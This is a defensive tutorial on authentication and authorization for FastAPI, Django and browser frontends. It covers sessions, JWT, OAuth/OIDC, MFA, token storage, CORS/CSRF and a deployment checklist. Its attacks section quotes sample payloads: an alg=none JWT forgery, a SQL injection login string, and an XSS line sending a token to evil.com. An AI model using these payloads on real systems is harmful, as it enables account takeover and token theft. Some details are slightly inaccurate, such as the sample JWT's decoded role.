What is Authentication?

Authentication and Authorization are the two pillars of security in every web app, API, and service you build. This guide takes you from zero to production-grade — covering JWT, OAuth, sessions, API keys, RBAC, MFA, and everything in between. Focused on FastAPI, Django, and HTML/JS frontend.

The two questions every request must answer

🪪 Authentication — "Who are you?"
Verifying the identity of a user or service. Are you who you claim to be? Proved by something you know (password), something you have (OTP device), or something you are (biometric). Without authentication, anyone can claim to be anyone.
🔑 Authorization — "What can you do?"
Determining what an authenticated identity is allowed to do. Can this user read this file? Can this service call this endpoint? Authorization always comes after authentication. You must know WHO someone is before deciding WHAT they can do.
The core mistake beginners make: Treating authentication and authorization as the same thing. They are completely separate concerns. A logged-in user (authenticated) may still be blocked from admin pages (not authorized). Always handle them independently in your code.

The authentication ecosystem at a glance

Identity Verification (Who) — Passwords · MFA · Biometrics · SSO
Proving who you are. The user provides credentials; the server validates them against stored data.
↓ once verified, issue a credential
Token / Session Issuance — JWT · Session ID · API Key · OAuth Token
Server gives back proof of identity. Client presents this on every subsequent request so the server doesn't need to re-verify credentials each time.
↓ every request carries the credential
Authorization Check (What) — RBAC · ABAC · Scopes · Permissions
Server validates the credential and checks permissions. Does this token allow access to this resource? Is this role allowed this action?
↓ allow or deny
Resource Access — API Endpoints · Files · Database Rows · Admin Actions
The protected resource is returned only if the identity is verified AND authorized. Otherwise, 401 Unauthorized or 403 Forbidden is returned.

Why HTTP makes auth hard

HTTP is stateless. Every request is completely independent — the server remembers nothing from the previous request. This means every single request must carry some proof of identity, or the user must log in every time. Auth systems exist entirely to solve this statelessness problem.
The problem
HTTP has no built-in concept of "a user" or "a session." Every GET, POST, PUT, DELETE arrives as a fresh, anonymous request.
The solution (server-side)
Sessions: server stores login state in memory/DB, gives client a session ID cookie. Server "remembers" you via the ID.
The modern solution
Tokens (JWT): client stores a signed token, sends it with every request. Server verifies the signature — no server-side storage needed.

Module 3 · Core Concept

AuthN vs AuthZ

Authentication and Authorization are different problems requiring different solutions. Confusing them leads to security holes.

Authentication (AuthN)

  • Proves identity: "Are you really Alice?"
  • Happens once at login
  • Result: a token or session is issued
  • Tools: passwords, MFA, biometrics, OAuth
  • Failure returns HTTP 401
  • Question: Who are you?

Authorization (AuthZ)

  • Proves permissions: "Can Alice do this?"
  • Happens on every protected request
  • Result: allow or deny the action
  • Tools: RBAC, ABAC, scopes, permission checks
  • Failure returns HTTP 403
  • Question: What can you do?

Real-world example — your voice calling app

1
User logs in (AuthN)
Alice sends username + password to POST /api/login. FastAPI verifies the hash. If correct, issues a JWT. Alice is now authenticated.
2
Alice starts a call (AuthZ check)
Alice sends POST /api/call/start with her JWT. FastAPI decodes the JWT, sees role: "user". Allowed — returns LiveKit token to join room.
3
Alice tries to access admin panel (AuthZ fail)
Alice sends GET /api/admin/users with her JWT. FastAPI decodes it — role is user, not admin. Returns 403 Forbidden. Authentication passed, authorization failed.
4
Token expires (AuthN fail on re-request)
Alice's JWT expires after 1 hour. Her next request returns 401 Unauthorized. Frontend detects this and uses the refresh token to get a new access token silently.

Module 6 · Classic Auth

Sessions & Cookies

The original solution to HTTP statelessness. Server stores session data; client holds only a session ID in a cookie. Used by Django out of the box. Excellent for server-rendered web apps.

Session auth flow

1
User submits login form
Browser sends POST /login with username + password in the request body.
2
Server validates and creates session
Server verifies credentials, creates a session record in DB/Redis with session_id → {user_id, created_at, data}. Returns Set-Cookie: sessionid=abc123; HttpOnly; Secure; SameSite=Lax.
3
Browser stores cookie automatically
Browser stores the cookie and sends it automatically on every subsequent request to the same domain. No JavaScript needed for this.
4
Server looks up session on every request
Server receives Cookie: sessionid=abc123, looks up that ID in Redis/DB, retrieves user data, and processes the request. Logout = delete the session record.

Sessions scale poorly. Every server must access the same session store (Redis). If you have multiple backend instances (Azure load balancer), they all need to share Redis. JWTs avoid this entirely because the token itself carries the state.

API Keys

API keys are long, random, opaque strings that act as a secret identifier for a service or user. The simplest form of machine-to-machine authentication.

API Key best practices

Key format
Use 32–64 bytes of cryptographically random data, base64url-encoded. Prefix with a namespace for easy identification: sk_live_aBcD1234.... Never use UUIDs — they have only 122 bits of entropy; crypto random gives 256.
Storage
Store a hash of the key in your database, not the plaintext key. Use SHA-256 or bcrypt. On validation, hash the incoming key and compare hashes. This way a DB breach doesn't leak all keys.
Transmission
Always in headers: X-API-Key: sk_live_xxx or Authorization: Bearer sk_live_xxx. Never in query params — they get logged by Nginx, Azure, CDNs, and browser history.
Rotation
Support multiple active keys per client so they can rotate without downtime. Provide a /api/keys/rotate endpoint. Set expiry dates. Send email warnings before expiry.

Module 8 · JWT Deep Dive

What is JWT?

JSON Web Token (JWT) is a compact, self-contained token format that carries claims (data) in a cryptographically signed package. The server can verify a JWT without a database lookup — this is what makes it powerful for stateless, scalable APIs.

Standard
RFC 7519
Parts
3 (Header.Payload.Sig)
Default algo
HS256 / RS256
Typical size
200–500 bytes

JWT vs Session: the fundamental difference

Session Cookies

  • Session ID stored on server (DB/Redis)
  • Every request requires a DB lookup
  • Easy to invalidate (just delete record)
  • Server stores all state — scales poorly
  • Session hijacking = attacker gets your ID
  • Works great for monolithic Django apps

JWT Tokens

  • All data inside the token itself
  • Server only verifies signature (no DB)
  • Hard to invalidate before expiry
  • Stateless — any server can verify
  • Token theft = attacker can use until expiry
  • Works great for APIs, SPAs, microservices
The big JWT trade-off: JWTs are stateless and scalable, but they cannot be instantly revoked. If a user logs out or changes their password, their existing JWT remains valid until it expires. The solution: use short-lived access tokens (15–60 min) + revocable refresh tokens stored in DB.
Module 9 · JWT Deep Dive

JWT Structure

A JWT is three base64url-encoded JSON objects separated by dots: header.payload.signature. Understanding each part is essential to working with JWTs correctly.

The three parts

A real JWT looks like:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c2VyXzEyMyIsInJvbGUiOiJ1c2VyIiwiZXhwIjoxNzAwMDAwMDAwfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
Part 1: Header (blue) — Algorithm declaration
Decodes to: {"alg": "HS256", "typ": "JWT"} — declares which algorithm was used to sign the token. alg can be HS256 (symmetric), RS256 (asymmetric), ES256 (elliptic curve).
Part 2: Payload (green) — Claims / data
Decodes to: {"sub": "user_123", "role": "admin", "exp": 1700000000, "iat": 1699996400} — the data you store. Not encrypted — anyone can read it. Never put passwords or secrets here.
Part 3: Signature (red) — Integrity guarantee
HMACSHA256(base64(header) + "." + base64(payload), secret). If anyone tampers with the header or payload, the signature won't match and the token is rejected.

Standard JWT claims (RFC 7519)

Signing algorithms compared

AlgorithmTypeKeyUse when
HS256Symmetric HMACOne shared secretSingle-service — simple, fast. Same key signs and verifies.
HS512Symmetric HMACOne shared secretSame as HS256 but stronger hash. Use for higher security.

HS256 for your stack: If you have one FastAPI backend and one frontend, HS256 is fine. If you have multiple services (FastAPI + Django + microservices), use RS256 so each service can verify tokens with the public key without accessing the private key.

JWT Auth Flow

The complete lifecycle of a JWT — from login to protected resource access to token refresh.

Complete JWT auth flow

1
Login — POST /api/auth/login
Client sends {"username": "alice", "password": "secret"}. Server verifies password hash against DB. On success, creates access token (15min) and refresh token (7 days).
2
Server responds with tokens
Returns {"access_token": "eyJ...", "refresh_token": "eyJ...", "token_type": "bearer"}. Client stores access token in memory or localStorage (risky — see token storage section). Stores refresh token in HttpOnly cookie.
3
Client uses access token
Every API call includes Authorization: Bearer eyJ.... Server decodes JWT, verifies signature and expiry — no DB query needed. Extracts user_id and role from payload.
4
Access token expires (401 returned)
After 15 minutes, any request returns 401. Client detects this, automatically sends refresh token to POST /api/auth/refresh.
5
New access token issued (silent refresh)
Server validates refresh token (checks DB — refresh tokens are stored). Issues new access token. Client retries the original request. User experiences no interruption.
6
Logout — DELETE /api/auth/logout
Server deletes the refresh token from DB (now it can't be used to get new access tokens). The access token is still technically valid until it expires — this is why short expiry is important. Add to blacklist if needed.

Access & Refresh Tokens

The dual-token pattern solves JWT's biggest weakness — inability to revoke — while maintaining stateless scalability.

Access Token
Lifetime: 5–15 minutes
Stored: JavaScript memory (never localStorage)
Sent via: Authorization header
Stateless: Yes — no DB check needed
Purpose: Short-lived proof to access API endpoints
Refresh Token
Lifetime: 7–30 days
Stored: HttpOnly Secure cookie
Sent via: Cookie (automatic)
Stateless: No — validated against DB
Purpose: Long-lived credential to get new access tokens
Token rotation: When a refresh token is used, immediately replace it with a new one and invalidate the old one. If an attacker steals a refresh token and uses it, the legitimate user's next refresh attempt will fail (old token already used), alerting you to a token theft.

Module 15 · OAuth 2.0

What is OAuth 2.0?

OAuth 2.0 is an authorization framework that enables a third-party application to obtain limited access to a service on behalf of a user — without ever seeing the user's password. It's the protocol behind "Login with Google," "Connect with GitHub," etc.

The core OAuth problem it solves

Before OAuth: To let a third-party app access your Google Drive, you'd have to give it your Google password. If the app was hacked, your Google password was compromised, and the attacker had full access to your account. OAuth solves this by using short-lived, scoped tokens instead of passwords.
Resource Owner
The user who owns the data. You, logging into an app with your Google account.
Client
The application that wants access. Your app that users log into via Google.
Authorization Server
The server that authenticates users and issues tokens. Google's auth server at accounts.google.com.
Resource Server
The API that holds the protected data. Google's API that returns user profile info.
Access Token
Short-lived credential (usually a JWT) that proves the client is authorized to access specific resources.
Scope
What the token is allowed to do: read:email profile openid. Least privilege principle.

Authorization Code + PKCE flow (the one you should use)

1
Client generates code_verifier and code_challenge
Frontend generates a random code_verifier string. Creates code_challenge = base64url(sha256(code_verifier)). PKCE prevents interception attacks.
2
Redirect to Authorization Server
https://accounts.google.com/o/oauth2/auth?client_id=...&redirect_uri=...&scope=email profile&response_type=code&code_challenge=...&code_challenge_method=S256
3
User logs in and consents on Google's page

4
Authorization code returned to redirect_uri
Google redirects back: https://yourapp.com/callback?code=4/P7q7W91&state=xyz. The code is single-use, expires in ~10 minutes, and is useless without the code_verifier.
5
Backend exchanges code for tokens
Your FastAPI backend POSTs the code + code_verifier to Google's token endpoint. Google verifies the challenge, returns access_token + id_token.
6
Your backend issues its own JWT to the user
Extract user info from Google's id_token. Create or update user in your DB. Issue your own JWT. Google's token stays on your server — frontend only gets your JWT.

Module 19 · OpenID Connect

OpenID Connect (OIDC)

OpenID Connect is an authentication layer built on top of OAuth 2.0. OAuth handles authorization (what you can do), OIDC adds identity (who you are). Every "Login with Google/GitHub/Microsoft" uses OIDC.

OAuth 2.0 vs OIDC in one sentence: OAuth 2.0 says "this app can access your files." OpenID Connect says "this is definitely Alice, here's her profile." OIDC uses OAuth's transport but adds a standardized way to convey user identity.

The ID Token

OIDC adds an ID Token (a JWT) to OAuth's access token. The ID Token contains standardized claims about the user's identity:

{ "iss": "https://accounts.google.com", // Issuer "sub": "1234567890", // User's unique ID at Google "aud": "your-client-id", // Your app "exp": 1700000000, "email": "alice@gmail.com", "email_verified": true, "name": "Alice Smith", "picture": "https://..." }

Module 20 · SAML 2.0

SAML 2.0

Security Assertion Markup Language — the enterprise SSO standard. Used when companies need employees to log into your app using their corporate identity (Active Directory, Okta, Azure AD).

Should you implement SAML? Only if enterprise customers require it. For new projects, use OpenID Connect — it achieves the same goals with far less XML complexity. If you're on Azure, use Azure AD / Entra ID with OIDC.
SAML key concepts
Identity Provider (IdP): The company's auth server (Okta, Azure AD, ADFS). Authenticates users.

Service Provider (SP): Your app. Trusts assertions from the IdP.

Assertion: XML document signed by IdP, states who the user is and what roles they have.
SAML vs OIDC
SAML: XML-based, complex, but universally supported in enterprise. Required by many large companies (banks, healthcare).

OIDC: JSON/JWT-based, modern, simple to implement. Preferred for new integrations.

Rule: If your enterprise customer says "we use Okta/Azure AD/ADFS," use their SSO. Azure AD supports both SAML and OIDC.

Module 22 · MFA

MFA · 2FA · TOTP

Multi-Factor Authentication adds a second layer of identity proof. Even if a password is stolen, the attacker can't log in without the second factor.

Something you know
Password, PIN, security questions. Single factor — can be stolen or guessed.
Something you have
TOTP app (Google Authenticator), SMS, hardware key (YubiKey). Time-limited, device-specific.
Something you are
Fingerprint, face ID, voice. Biometric — hardest to steal but requires hardware.

TOTP — Time-based One-Time Passwords (Google Authenticator)

1
Generate a secret for the user
Server generates a random 160-bit base32 secret. This is stored in your DB (encrypted) and shared with the user's auth app via QR code.
2
User scans QR code in Google Authenticator
The QR code encodes: otpauth://totp/YourApp:alice@example.com?secret=BASE32SECRET&issuer=YourApp. The app stores the secret and computes a 6-digit code every 30 seconds.
3
On login, user provides TOTP code
After password check succeeds, ask for 6-digit TOTP. Server recomputes HOTP(secret, floor(current_time / 30)) and compares. Allow ±1 window for clock drift.

Module 26 · Admin Panel Security

Admin Panel Authentication

Admin panels are the highest-value targets in your application. They require multiple layers of protection beyond standard auth.

Admin security layers (apply all of them)

1
Non-obvious URL
Never use /admin, /dashboard, /management. Use a random, non-guessable path: /x9k2m-control. Security through obscurity isn't a defense by itself, but it eliminates automated scanners.
2
IP Whitelist via Nginx
Only allow access from your office IP or VPN. In Nginx: allow 203.x.x.x; deny all;. Azure NSG can also block at the firewall level before traffic reaches Nginx.
3
Separate auth with MFA mandatory
Admin login must require TOTP/MFA. Never allow admin access with just a password. Even if a password is phished, MFA stops the attack.
4
Short-lived sessions for admin
Admin JWT should expire in 15–30 minutes with no silent refresh. Admin should re-authenticate for sensitive actions. Inactivity timeout: if no action for 10 min, force re-login.
5
Audit logging — log everything
Log every admin action: who did what to which record at what time from which IP. Store logs separately (write-only from the app). Non-repudiation — admins can't deny their actions.
6
Re-confirm for destructive actions
Deleting users, bulk operations, changing permissions: require password re-entry ("sudo mode") or a second confirmation step. Prevents CSRF and accidental actions.

Where to Store Tokens

Where you store tokens determines your attack surface. This is one of the most debated security topics in web development. Here's the definitive answer.

Memory (JS var)NoneNoneNoBest for access token
HttpOnly CookieNone (JS can't read)Possible (use CSRF token)YesBest for refresh token
localStorageHigh (readable by any JS)NoneYesNever use for auth tokens
sessionStorageHigh (readable by any JS)NoneNo (tab close)Avoid for auth tokens
Regular CookieHigh (readable by JS)PossibleYesNever — use HttpOnly

The recommended pattern

Access Token → JavaScript memory (a const variable)
Short-lived (15 min). Invisible to XSS since attackers can't read JS variables at rest. Lost on page refresh — re-fetched using refresh token automatically.
Refresh Token → HttpOnly Secure SameSite=Lax Cookie
Long-lived (7 days). HttpOnly flag makes it completely invisible to JavaScript. Survives page refreshes. Protected against CSRF by SameSite=Lax.
The XSS argument against localStorage: If your app has an XSS vulnerability (and most do at some point), an attacker can run localStorage.getItem('token') and steal every user's tokens. With HttpOnly cookies + in-memory access tokens, XSS cannot read either token type.
Module 32 · Token Transport

CORS & CSRF

Two browser security mechanisms that every backend developer must understand to build secure, functional APIs.

CORS — Cross-Origin Resource Sharing

CORS controls which domains can call your API from a browser. It's enforced by the browser (not your server). Servers declare what's allowed; browsers enforce it.

The CORS preflight: Before sending a "dangerous" request (non-GET, or with custom headers like Authorization), the browser sends an OPTIONS request asking "is this allowed?" Your server must respond with the right CORS headers or the actual request is blocked.
FastAPI CORS configuration
from fastapi.middleware.cors import CORSMiddleware app.add_middleware( CORSMiddleware, allow_origins=[ "https://yourapp.com", "https://admin.yourapp.com", # "http://localhost:3000", ← Only in development ], allow_credentials=True, # Required to send cookies cross-origin allow_methods=["GET", "POST", "PUT", "DELETE"], allow_headers=["Authorization", "Content-Type", "X-CSRF-Token"], ) # NEVER use allow_origins=["*"] with allow_credentials=True

CSRF — Cross-Site Request Forgery

CSRF tricks a logged-in user's browser into making unintended requests to your API. If a user visits a malicious site while logged into your app, the malicious site can trigger actions using the user's cookies.

Django CSRF (built-in and automatic)
# Django has CSRF protection enabled by default via CsrfViewMiddleware # For AJAX calls, include the CSRF token in the header: # Frontend JavaScript: function getCsrfToken() { return document.cookie.split(';') .find(c => c.trim().startsWith('csrftoken=')) ?.split('=')[1]; } fetch('/api/data', { method: 'POST', headers: { 'X-CSRFToken': getCsrfToken(), // Django expects this header 'Content-Type': 'application/json' }, body: JSON.stringify(data) }); # FastAPI with cookies: implement CSRF token pattern # Or: Use SameSite=Lax cookies — protects against CSRF without tokens

CSRF protection strategies

  • SameSite=Lax or Strict cookies (browser-enforced)
  • CSRF token in form/header (Django built-in)
  • Verify Origin/Referer header
  • Double-submit cookie pattern

What doesn't protect against CSRF

  • HTTPS alone (CSRF works over HTTPS)
  • Checking for authentication (user IS logged in)
  • localStorage tokens (but they're still XSS-risky)
  • IP address validation
Module 33 · Attacks

Common Auth Attacks

You can't defend against attacks you don't understand. Here are the most common authentication attacks and exactly how to prevent them.

JWT Algorithm Confusion Attack (alg=none) +
Attack: Attacker modifies the JWT header to {"alg": "none"} and removes the signature. Some libraries skip verification for the "none" algorithm.

Impact: Attacker can forge any JWT with any claims (admin role, any user ID) without knowing the secret.

Defense: Always specify the allowed algorithm explicitly when verifying: jwt.decode(token, secret, algorithms=["HS256"]). Never allow "none" or accept algorithm from the token header.
JWT Secret Brute Force +
Attack: If your HS256 JWT secret is weak (e.g., "secret", "1234"), an attacker with a stolen token can crack the secret offline and forge tokens.

Defense: Use cryptographically random secrets of at least 256 bits: python -c "import secrets; print(secrets.token_hex(32))". Store in Azure Key Vault, not environment files checked into git.
SQL Injection in Login Form +
Attack: Attacker enters ' OR '1'='1 as username. If backend does f"SELECT * FROM users WHERE username='{username}'", the query returns all users and logs them in as the first one.

Defense: Always use parameterized queries or ORM. SQLAlchemy, Django ORM, and FastAPI with Pydantic all prevent this automatically. Never use string formatting in SQL queries.
Brute Force / Credential Stuffing +
Attack: Automated scripts try millions of username/password combinations. Credential stuffing uses leaked password databases from other sites.

Defense: Rate limiting (max 5 failed attempts, then 15-minute lockout), CAPTCHA after failures, alerting users of login from new locations, MFA, checking passwords against HaveIBeenPwned API.
XSS → Token Theft +
Attack: Attacker injects JavaScript (via comment, user input, etc.) that runs fetch('https://evil.com?token=' + localStorage.getItem('jwt')).

Defense: Never store tokens in localStorage. Use HttpOnly cookies for refresh tokens and memory for access tokens. Sanitize all user input. Set Content-Security-Policy header.
CSRF — Cross-Site Request Forgery +
Attack: A malicious website makes your logged-in user's browser submit a form or AJAX request to your API, using their existing session cookie.

Defense: SameSite=Lax cookies, CSRF tokens, verify Origin header. If using JWT in Authorization header (not cookies), CSRF is not a risk since browsers don't auto-send Authorization headers.
Open Redirect After Login +
Attack: https://yourapp.com/login?next=https://evil.com. After login, if you blindly redirect to the next parameter, the user is sent to the attacker's site (which can display a fake login page to steal credentials again).

Defense: Only allow redirect to paths within your domain. if next.startswith('/') and not next.startswith('//'): redirect(next). Reject any redirect with a full domain.
Timing Attack on Secret Comparison +
Attack: Regular string comparison a == b stops at the first mismatched character. By measuring how long the comparison takes, an attacker can guess the secret character by character.

Defense: Always use secrets.compare_digest(a, b) which takes constant time regardless of where strings differ. Use this for API keys, HMAC signatures, and any secret comparison.

Security Checklist

A comprehensive checklist for every application you deploy. Run through this before going to production.

Authentication Checklist

✅ Passwords & Credentials +
  • Passwords hashed with bcrypt (cost 12+) or Argon2id
  • Minimum password length enforced (12+ characters)
  • No password stored in plaintext anywhere (logs, DB, env files)
  • Passwords checked against HaveIBeenPwned API on registration
  • Account lockout after 5 failed attempts (15 min lockout)
  • Secure password reset flow (token-based, not "security questions")
  • Password reset tokens expire in 15-60 minutes, single use
✅ JWT Tokens +
  • JWT secret is 256-bit random (not a word or phrase)
  • JWT secret stored in Azure Key Vault, not .env file in repo
  • Access token expires in 15 minutes or less
  • Algorithm specified explicitly in decode call (not from token)
  • "none" algorithm not accepted under any circumstances
  • Sensitive data NOT in JWT payload (passwords, full PII)
  • Refresh tokens stored in HttpOnly Secure SameSite=Lax cookies
  • Refresh tokens stored in DB with revocation capability
  • Token rotation on every refresh
✅ Transport Security +
  • HTTPS enforced everywhere — no HTTP in production
  • HSTS header set (Strict-Transport-Security)
  • TLS 1.2+ only (TLS 1.0/1.1 disabled in Nginx)
  • Secure cookies have Secure flag set
  • CORS allow_origins is a specific list, not wildcard *
  • CORS credentials not used with wildcard origins
  • X-Content-Type-Options: nosniff header set
  • X-Frame-Options: DENY header set (anti-clickjacking)
  • Content-Security-Policy header configured
✅ API & Endpoints +
  • All endpoints require authentication (none left open by accident)
  • All endpoints have authorization checks (not just AuthN)
  • Rate limiting on auth endpoints (login, register, reset)
  • Input validated with Pydantic (FastAPI) or serializers (DRF)
  • SQL queries use ORM/parameterized (no string formatting)
  • Webhook signatures verified before processing
  • Internal endpoints blocked at Nginx level
  • Admin URL non-obvious and IP-restricted
  • Audit logs for all admin actions
  • secrets.compare_digest used for all secret comparisons
✅ Infrastructure (Azure + Nginx) +
  • NSG rules: only ports 80, 443, 22 (your IP) open to internet
  • Internal service ports blocked at NSG level
  • All secrets in Azure Key Vault
  • Azure VM using Managed Identity (no credentials needed for Azure services)
  • Nginx rate limiting configured for auth and API routes
  • Admin paths IP-whitelisted in Nginx
  • SSH key-based auth only (no password SSH)
  • OS and packages regularly updated (security patches)
  • Error messages don't expose stack traces or system info
  • Logging enabled for auth events (login, failed login, logout, token refresh)
